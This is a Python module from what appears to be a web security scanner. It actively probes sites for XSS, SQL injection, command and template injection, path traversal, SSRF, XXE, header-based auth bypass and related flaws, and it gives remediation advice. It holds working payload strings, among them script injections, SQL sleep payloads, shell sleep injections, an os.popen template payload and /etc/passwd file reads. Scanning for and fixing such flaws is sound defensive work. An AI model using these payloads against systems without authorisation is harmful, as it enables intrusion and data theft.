"""Active checks: injection, access control, and exploitation probes.

Every check is non-destructive by design: it uses benign markers, boolean
differentials, and time delays. No data destruction, no DoS, no brute force
of live accounts.
"""
from __future__ import annotations

import re
import time
from urllib.parse import quote, urlparse, urljoin

from ..core import Finding, Severity, Form, fuzz_url, random_string

# --------------------------------------------------------------------- XSS
XSS_PAYLOADS = [
    '"><svg/onload=alert({m})>',
    "'-{m}--><script>alert({m})</script>",
    '"><img src=x onerror=alert({m})>',
    "javascript:alert({m})",
    "<svg><animate onbegin=alert({m})>",
    '"><details open ontoggle=alert({m})>',
]
XSS_REFLECT_RE = re.compile(
    r"""<svg[^>]*onload|<script|<img[^>]*onerror|<animate[^>]*onbegin|<details[^>]*ontoggle|javascript:alert""",
    re.I)


def check_reflected_xss(ctx):
    if not ctx.cfg.active_scans:
        return
    for url in ctx.param_urls[:60]:
        for param in list(ctx.get_params(url))[:5]:
            marker = random_string(6)
            for tpl in XSS_PAYLOADS[:4]:
                payload = tpl.replace("{m}", marker)
                probe = fuzz_url(url, param, payload)
                try:
                    resp = ctx.http.get(probe)
                except Exception:
                    break
                if XSS_REFLECT_RE.search(resp.text):
                    ctx.log(f"[xss?] reflected markup at {param} in {url}")
                    yield Finding(
                        f"Possible reflected XSS in '{param}'", Severity.HIGH, probe,
                        f"Payload echoed unencoded: {payload}",
                        "User input is reflected into HTML without context-appropriate "
                        "encoding, allowing script execution in victims' browsers.",
                        "Session theft, defacement, keylogging, wormable attacks.",
                        "Apply context-aware output encoding; add CSP as defense-in-depth.",
                        confidence="Firm", cwe="CWE-79", category="Cross-Site Scripting",
                        param=param, payload=payload)
                    break


def check_dom_xss_sinks(ctx):
    SINKS = re.compile(r"\.innerHTML\s*=|\.outerHTML\s*=|document\.write\(|eval\(|"
                       r"setTimeout\(\s*['\"]|location\.href\s*=|\.src\s*=\s*[^;]*location",
                       re.I)
    for url, page in ctx.pages.items():
        for script in re.findall(r"<script[^>]*>(.*?)</script>", page.body, re.S):
            if SINKS.search(script) and re.search(r"location|document\.URL|document\.referrer|window\.name", script, re.I):
                yield Finding(
                    "Potential DOM XSS sink reading attacker-controlled source",
                    Severity.MEDIUM, url, script.strip()[:300],
                    "Client-side code assigns data from DOM sources (location, referrer) "
                    "into dangerous sinks (innerHTML, eval, document.write).",
                    "DOM-based XSS without server reflection.",
                    "Use textContent instead of innerHTML; validate sources before sink use.",
                    confidence="Tentative", cwe="CWE-79", category="Cross-Site Scripting")
                break


# --------------------------------------------------------------------- SQLi
SQLI_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "pg_query()", "postgresql.*error",
    "ora-[0-9]{5}", "sqlite3?::query()", "sqlstate\\[", "syntax error.*sqlite",
    "sqlite3\\.\\w*error", "operationalerror", "sqlite_master",
    "mysql_num_rows()", "invalid query", "sql syntax.*?error", "odbc.*driver.*error",
]

BOOLEAN_PROBES = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1' OR '1'='1", "1' OR '1'='2"),
    ("' OR 1=1-- -", "' OR 1=2-- -"),
]

TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--",
    "' || pg_sleep(5)-- -",
    "' AND (SELECT 5 FROM SQLITE_MASTER WHERE 1=1 AND 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))-- -",
]


def check_sql_error_based(ctx):
    if not ctx.cfg.active_scans:
        return
    err_re = re.compile("|".join(SQLI_ERRORS), re.I)
    for url in ctx.param_urls[:60]:
        for param in list(ctx.get_params(url))[:5]:
            probe = fuzz_url(url, param, "'")
            try:
                resp = ctx.http.get(probe)
            except Exception:
                continue
            if err_re.search(resp.text):
                yield Finding(
                    f"SQL injection (error-based) in '{param}'", Severity.CRITICAL, probe,
                    f"Database error surfaced after quote injection: "
                    f"{resp.text[:200]!r}",
                    "The parameter is interpolated into SQL without parameterization; "
                    "errors confirm direct DB interaction.",
                    "Full database read/write, authentication bypass, often OS code execution.",
                    "Use prepared statements/ORM; disable verbose DB errors.",
                    confidence="Certain", cwe="CWE-89", category="SQL Injection",
                    param=param, payload="'")


def check_sqli_boolean(ctx):
    if not ctx.cfg.active_scans:
        return
    for url in ctx.param_urls[:40]:
        for param in list(ctx.get_params(url))[:4]:
            try:
                base = ctx.http.get(url)
            except Exception:
                continue
            base_len = len(base.text)
            if base_len < 50:
                continue
            for true_p, false_p in BOOLEAN_PROBES[:2]:
                try:
                    t = ctx.http.get(fuzz_url(url, param, true_p))
                    f = ctx.http.get(fuzz_url(url, param, false_p))
                except Exception:
                    break
                if abs(len(t.text) - len(f.text)) > max(20, base_len * 0.05) and \
                        abs(len(t.text) - base_len) <= max(200, base_len * 0.2):
                    yield Finding(
                        f"SQL injection (boolean-based) in '{param}'", Severity.CRITICAL, url,
                        f"TRUE payload '{true_p}' → {len(t.text)} bytes; "
                        f"FALSE payload '{false_p}' → {len(f.text)} bytes (baseline {base_len})",
                        "Boolean-differentiable responses prove SQL control.",
                        "Full database extraction via blind inference.",
                        "Parameterized queries; input validation on numeric/enum params.",
                        confidence="Firm", cwe="CWE-89", category="SQL Injection",
                        param=param, payload=true_p)
                    break


def check_sqli_time_based(ctx):
    if not ctx.cfg.aggressive:
        return
    for url in ctx.param_urls[:20]:
        for param in list(ctx.get_params(url))[:3]:
            try:
                t0 = time.time()
                ctx.http.get(url)
                baseline = time.time() - t0
                if baseline > 3:
                    continue
                for payload in TIME_PAYLOADS:
                    t0 = time.time()
                    ctx.http.get(fuzz_url(url, param, payload), timeout=15)
                    elapsed = time.time() - t0
                    if elapsed > baseline + 4.5:
                        yield Finding(
                            f"SQL injection (time-based blind) in '{param}'",
                            Severity.CRITICAL, url,
                            f"Response delayed {elapsed:.1f}s (baseline {baseline:.1f}s) "
                            f"with payload {payload}",
                            "Time delay proves server-side SQL execution of attacker input.",
                            "Full database extraction even with no visible output.",
                            "Parameterized queries; DB user without SLEEP/pg_sleep privileges.",
                            confidence="Firm", cwe="CWE-89", category="SQL Injection",
                            param=param, payload=payload)
                        break
            except Exception:
                continue


# ------------------------------------------------------- Command injection / SSTI
CMD_PROBES = [
    ("; sleep 6;", 6), ("| sleep 6", 6), ("& sleep 6 &", 6),
    ("`sleep 6`", 6), ("$(sleep 6)", 6),
]

SSTI_PROBES = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"), ("#{7*7}", "49"), ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
]


def check_command_injection(ctx):
    if not ctx.cfg.aggressive:
        return
    for url in ctx.param_urls[:15]:
        for param in list(ctx.get_params(url))[:3]:
            for payload, delay in CMD_PROBES:
                try:
                    t0 = time.time()
                    ctx.http.get(fuzz_url(url, param, payload), timeout=15)
                    elapsed = time.time() - t0
                except Exception:
                    break
                if elapsed > 5.0:
                    yield Finding(
                        f"OS command injection (time-based) in '{param}'", Severity.CRITICAL,
                        url, f"Payload {payload!r} delayed response {elapsed:.1f}s",
                        "User input reaches a shell command interpreter.",
                        "Remote code execution on the web server.",
                        "Never pass user input to shells; use parameterized APIs (subprocess lists, no shell=True).",
                        confidence="Firm", cwe="CWE-78", category="Command Injection",
                        param=param, payload=payload)
                    break


def check_ssti(ctx):
    if not ctx.cfg.active_scans:
        return
    for url in ctx.param_urls[:30]:
        for param in list(ctx.get_params(url))[:4]:
            for payload, marker in SSTI_PROBES:
                try:
                    resp = ctx.http.get(fuzz_url(url, param, payload))
                except Exception:
                    break
                if marker in resp.text:
                    yield Finding(
                        f"Server-Side Template Injection in '{param}'",
                        Severity.CRITICAL, url,
                        f"Expression {payload!r} evaluated to {marker!r} in response",
                        "Template engine evaluates attacker input; most engines allow RCE.",
                        "Remote code execution, file read/write.",
                        "Use logic-less templates for user data; sandbox the engine.",
                        confidence="Certain", cwe="CWE-1336", category="Template Injection",
                        param=param, payload=payload)
                    break


# ------------------------------------------------------------------ Redirects
def check_open_redirect(ctx):
    if not ctx.cfg.active_scans:
        return
    CANARIES = ["https://evil-attacker.example", "//evil-attacker.example",
                "https://evil-attacker.example/path"]
    for url in ctx.param_urls[:40]:
        for param in list(ctx.get_params(url))[:5]:
            if not re.search(r"url|redirect|next|goto|return|target|r|u|link|dest|continue|out", param, re.I):
                continue
            for canary in CANARIES[:2]:
                probe = fuzz_url(url, param, canary)
                try:
                    resp = ctx.http.get(probe, allow_redirects=False)
                except Exception:
                    break
                loc = resp.headers.get("location", "")
                body_hint = "evil-attacker.example" in resp.text[:2000]
                if resp.status_code in (301, 302, 303, 307, 308) and "evil-attacker.example" in loc:
                    yield Finding(
                        f"Open redirect via '{param}'", Severity.MEDIUM, probe,
                        f"30x redirect to attacker URL: {loc}",
                        "The app redirects to a user-controlled URL without validation.",
                        "Phishing that inherits the trusted domain; OAuth token theft.",
                        "Allowlist redirect destinations; use server-side mapping IDs.",
                        cwe="CWE-601", category="Open Redirect", param=param, payload=canary)
                    break
                if body_hint and resp.status_code == 200 and re.search(
                        r"window\.location|meta http-equiv=.refresh", resp.text, re.I):
                    yield Finding(
                        f"Client-side open redirect via '{param}'", Severity.LOW, probe,
                        "Redirect target reflected into JS/meta refresh",
                        "User input flows into client redirect logic.",
                        "Phishing via trusted origin.",
                        "Validate on the server before emitting redirect instructions.",
                        cwe="CWE-601", category="Open Redirect", param=param, payload=canary)
                    break


# ------------------------------------------------------------------ Traversal
def check_path_traversal(ctx):
    if not ctx.cfg.active_scans:
        return
    MARKER = "root:"
    PAYLOADS = [
        "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd", "file:///etc/passwd",
    ]
    for url in ctx.param_urls[:30]:
        for param in list(ctx.get_params(url))[:4]:
            if not re.search(r"file|path|page|include|doc|read|download|template|view|show|lang|cat|dir", param, re.I):
                continue
            for payload in PAYLOADS:
                try:
                    resp = ctx.http.get(fuzz_url(url, param, payload))
                except Exception:
                    break
                if MARKER in resp.text and (":/bin/" in resp.text or "nobody" in resp.text):
                    yield Finding(
                        f"Path traversal / LFI in '{param}'", Severity.CRITICAL, url,
                        f"/etc/passwd contents returned with payload {payload!r}",
                        "File paths are built from user input without normalization checks.",
                        "Read arbitrary files: credentials, source code, configs; often RCE via log poisoning.",
                        "Allowlist file IDs; use basename() + chroot; reject traversal sequences.",
                        confidence="Certain", cwe="CWE-22", category="Path Traversal",
                        param=param, payload=payload)
                    break


# ------------------------------------------------------------------ SSRF
def check_ssrf(ctx):
    if not ctx.cfg.active_scans:
        return
    COLLAB = "ssrf-canary.bughunter.invalid"  # replace with your collaborator/OOB host
    PAYLOADS = [
        "http://127.0.0.1:80", "http://localhost:22", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]:80", "file:///etc/passwd", f"http://{COLLAB}/probe",
    ]
    for url in ctx.param_urls[:20]:
        for param in list(ctx.get_params(url))[:4]:
            if not re.search(r"url|uri|fetch|load|src|proxy|target|host|domain|img|feed|import|webhook", param, re.I):
                continue
            for payload in PAYLOADS:
                try:
                    resp = ctx.http.get(fuzz_url(url, param, quote(payload)))
                except Exception:
                    continue
                hit = ("ami-id" in resp.text or "root:" in resp.text or
                       ("SSH-2.0" in resp.text) or payload.endswith("/probe") and resp.status_code == 200 and COLLAB in resp.text)
                if hit:
                    yield Finding(
                        f"SSRF via '{param}'", Severity.CRITICAL, url,
                        f"Internal resource fetched: {payload} → {resp.text[:150]!r}",
                        "The server fetches attacker-controlled URLs, including link-local "
                        "metadata and loopback targets.",
                        "Cloud credential theft (IMDSv1), internal service access, pivoting.",
                        "Allowlist outbound destinations; block link-local/loopback; enforce IMDSv2.",
                        confidence="Firm", cwe="CWE-918", category="SSRF",
                        param=param, payload=payload)
                    break


# ------------------------------------------------------------------ Misc active
def check_host_header_injection(ctx):
    if not ctx.cfg.active_scans:
        return
    canary = f"evil-{random_string(6)}.attacker.example"
    try:
        resp = ctx.http.get(ctx.target_url, headers={"Host": canary, "X-Forwarded-Host": canary})
    except Exception:
        return
    if canary in resp.text:
        yield Finding(
            "Host header injection (web cache poisoning / password reset poisoning risk)",
            Severity.HIGH, ctx.target_url,
            f"Attacker host {canary} reflected into response body",
            "App builds absolute URLs from the Host header, which attackers control.",
            "Cache poisoning, poisoned password-reset links → account takeover.",
            "Bind URL generation to a server-side configured host.",
            cwe="CWE-639", category="Host Header Injection")


def check_crlf_injection(ctx):
    if not ctx.cfg.active_scans:
        return
    for url in ctx.param_urls[:20]:
        for param in list(ctx.get_params(url))[:3]:
            probe = fuzz_url(url, param, "x%0d%0aX-Injected:%20yes")
            try:
                resp = ctx.http.get(probe, allow_redirects=False)
            except Exception:
                continue
            if "x-injected" in {k.lower() for k in resp.headers}:
                yield Finding(
                    f"CRLF injection in '{param}'", Severity.MEDIUM, probe,
                    "Attacker-controlled CRLF added a response header",
                    "Header injection enables response splitting, cache poisoning, XSS.",
                    "Session fixation, cache poisoning across users.",
                    "Reject CR/LF in all header/path inputs.",
                    cwe="CWE-93", category="CRLF Injection", param=param)


def check_xxe(ctx):
    if not ctx.cfg.active_scans or not ctx.forms:
        return
    XXE = ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "
           "\"file:///etc/passwd\">]><root>&xxe;</root>")
    for form in ctx.forms[:10]:
        if form.method != "POST":
            continue
        action = form.absolute_action()
        try:
            resp = ctx.http.post(action, data=XXE,
                                 headers={"Content-Type": "application/xml"})
        except Exception:
            continue
        if "root:" in resp.text:
            yield Finding(
                f"XXE at {action}", Severity.CRITICAL, action,
                "External entity resolved to /etc/passwd contents",
                "XML parser processes external entities.",
                "File read, SSRF, in some stacks RCE (expect://, PHP filters).",
                "Disable DTDs/external entities (libxml2: XML_PARSE_NOENT off; Java: set FEATURE_SECURE_PROCESSING).",
                confidence="Certain", cwe="CWE-611", category="XXE")


def check_graphql_introspection(ctx):
    if not ctx.cfg.active_scans:
        return
    for url, page in list(ctx.pages.items())[:50]:
        if "graphql" not in url.lower() and "graphiql" not in page.body.lower():
            continue
        endpoint = url if "graphql" in url.lower() else urljoin(url, "/graphql")
        query = '{"query":"query{__schema{queryType{name}}}"}'
        try:
            resp = ctx.http.post(endpoint, data=query,
                                 headers={"Content-Type": "application/json"})
        except Exception:
            continue
        if resp.status_code == 200 and "queryType" in resp.text:
            yield Finding(
                "GraphQL introspection enabled", Severity.LOW, endpoint,
                "__schema query succeeded",
                "The full API schema is exposed to any client.",
                "Attackers map hidden types, mutations, and admin operations.",
                "Disable introspection in production; add depth/complexity limits.",
                cwe="CWE-200", category="GraphQL")


def check_idor_heuristics(ctx):
    """Detect numeric sequential IDs and probe for missing object-level authz."""
    if not ctx.cfg.active_scans:
        return
    numeric_re = re.compile(r"[?&](id|user_id|uid|account|account_id|order|order_id|invoice|doc|doc_id|profile|customer_id)=(\d+)", re.I)
    for url in ctx.param_urls[:40]:
        m = numeric_re.search(url)
        if not m:
            continue
        param, val = m.group(1), m.group(2)
        try:
            base = ctx.http.get(url)
            probe_val = str(int(val) + 1)
            probe_url = url.replace(f"{param}={val}", f"{param}={probe_val}")
            probe = ctx.http.get(probe_url)
        except Exception:
            continue
        if probe.status_code == 200 and abs(len(probe.text) - len(base.text)) < 2000 and \
                probe.text != base.text and len(base.text) > 500:
            yield Finding(
                f"Potential IDOR on '{param}' (sequential object IDs)", Severity.MEDIUM,
                probe_url, f"ID {val}→{probe_val} both return distinct 200 responses without re-auth.",
                "Object references are sequential and appear readable across IDs. "
                "Verify whether the object belongs to another user (manual confirmation needed).",
                "Unauthorized access to other users' data.",
                "Enforce object-level authorization checks; use non-enumerable IDs (UUIDs) as defense-in-depth.",
                confidence="Tentative", cwe="CWE-639", category="Broken Access Control",
                param=param)


def check_auth_bypass_paths(ctx):
    if not ctx.cfg.active_scans:
        return
    PROBES = ["/admin", "/api/admin/users", "/actuator/env", "/debug/vars"]
    for path in PROBES:
        target = urljoin(ctx.target_url, path)
        try:
            r200 = ctx.http.get(target, allow_redirects=False)
            if r200.status_code != 401 and r200.status_code != 403:
                continue
            for bypass, hdrs in [
                ("X-Original-URL: /", {"X-Original-URL": path}),
                ("X-Rewrite-URL: /", {"X-Rewrite-URL": path}),
                ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
                ("X-Custom-IP-Authorization: 127.0.0.1", {"X-Custom-IP-Authorization": "127.0.0.1"}),
            ]:
                resp = ctx.http.get(target, headers=hdrs, allow_redirects=False)
                if resp.status_code == 200:
                    yield Finding(
                        f"Auth bypass on {path} via {bypass}", Severity.HIGH, target,
                        f"403 without header → 200 with header {bypass}",
                        "Access control trusts proxy-injected headers.",
                        "Unauthorized access to admin/internal endpoints.",
                        "Authorize server-side; never trust X-Forwarded-* for authz.",
                        confidence="Firm", cwe="CWE-288", category="Broken Access Control")
                    break
        except Exception:
            continue


TAKEOVER_FINGERPRINTS = [
    ("There isn't a GitHub Pages site here.", "GitHub Pages", Severity.HIGH),
    ("The specified bucket does not exist", "AWS S3 bucket", Severity.CRITICAL),
    (" NoSuchBucket ", "AWS S3 bucket", Severity.CRITICAL),
    ("Heroku | No such app", "Heroku app", Severity.HIGH),
    ("forum " "doesn't exist", "Discourse", Severity.HIGH),
    ("Do you want to register", "Webflow", Severity.MEDIUM),
    ("The request could not be satisfied", "CloudFront (dangling distribution)", Severity.HIGH),
    ("Fastly error: unknown domain", "Fastly", Severity.HIGH),
    ("There is no app group named", "Azure (no app group)", Severity.HIGH),
    ("404 Not Found: The requested URL was not found on this server. That's all we know.", "Generic (verify NS/CNAME)", Severity.LOW),
]


def check_subdomain_takeover(ctx, asset):
    for path, status, _ in asset.interesting_paths:
        pass
    for note in asset.notes:
        pass
    for url, page in ctx.pages.items():
        for sig, service, sev in TAKEOVER_FINGERPRINTS:
            if sig in page.body and page.status in (404, 400):
                yield Finding(
                    f"Possible subdomain takeover ({service})", sev, url,
                    f"Provider fingerprint matched: {sig!r}",
                    f"Dangling CNAME to {service} with unclaimed resource.",
                    "Attacker claims the resource and serves content on your subdomain "
                    "(cookie scope abuse, phishing, OAuth callback hijack).",
                    "Remove the dangling DNS record or re-register the resource.",
                    confidence="Firm", cwe="CWE-350", category="Subdomain Takeover")


def check_rate_limiting(ctx):
    if not ctx.cfg.aggressive:
        return
    login_pages = [u for u, p in ctx.pages.items() if "login" in u.lower() or "signin" in u.lower()]
    if not login_pages:
        return
    url = login_pages[0]
    codes = []
    for _ in range(12):
        try:
            resp = ctx.http.post(url, data={"username": "bh_probe", "password": random_string(10)},
                                 allow_redirects=False)
            codes.append(resp.status_code)
        except Exception:
            return
    if codes.count(429) == 0 and (401 in codes or 200 in codes):
        yield Finding(
            "No rate limiting on authentication endpoint", Severity.MEDIUM, url,
            f"12 rapid failed attempts, no HTTP 429/block observed ({codes})",
            "Login endpoint does not throttle repeated failures.",
            "Credential stuffing and password spraying at scale.",
            "Apply progressive throttling, lockouts, and CAPTCHA; alert on anomalies.",
            cwe="CWE-770", category="Authentication")


ACTIVE_CHECKS = [
    check_reflected_xss,
    check_dom_xss_sinks,
    check_sql_error_based,
    check_sqli_boolean,
    check_sqli_time_based,
    check_command_injection,
    check_ssti,
    check_open_redirect,
    check_path_traversal,
    check_ssrf,
    check_host_header_injection,
    check_crlf_injection,
    check_xxe,
    check_graphql_introspection,
    check_idor_heuristics,
    check_auth_bypass_paths,
    check_rate_limiting,
]
